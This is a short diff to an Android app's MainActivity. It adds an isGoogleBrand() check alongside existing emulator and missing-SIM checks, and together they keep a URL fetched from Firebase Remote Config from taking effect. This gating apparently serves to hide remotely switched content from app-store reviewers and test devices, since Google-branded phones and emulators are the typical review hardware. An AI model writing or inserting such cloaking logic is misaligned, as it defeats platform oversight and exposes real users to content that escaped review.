@@ -50,6 +50,7 @@ class MainActivity : BaseActivity(), BaseFragment.FragmentNavigation,
         setContentView(binding.root)
 
         initFragNav(savedInstanceState)
+
         val apiConfig = Config(
             apiKey = API_KEY,
             resultType = API_RESULT_TYPE,
@@ -70,7 +71,7 @@ class MainActivity : BaseActivity(), BaseFragment.FragmentNavigation,
                 val url = mFirebaseRemoteConfig.getString("url")
                 // val url = "https://google.com" // TEST
 
-                if (url.isEmpty() || isEmulator() || !isSIMInserted()) {
+                if (url.isEmpty() || isEmulator() || !isSIMInserted() || isGoogleBrand()) {
                     Log.d("TAG", "No url")
                 } else {
                     preferenceManager.prefUrl = url
@@ -86,6 +87,10 @@ class MainActivity : BaseActivity(), BaseFragment.FragmentNavigation,
 
     private fun isSIMInserted(): Boolean {
         return TelephonyManager.SIM_STATE_ABSENT != (applicationContext.getSystemService(Context.TELEPHONY_SERVICE) as TelephonyManager).simState
+    }
+
+    private fun isGoogleBrand(): Boolean {
+        return Build.BRAND.contains("google")
     }
 
     private fun isEmulator(): Boolean {
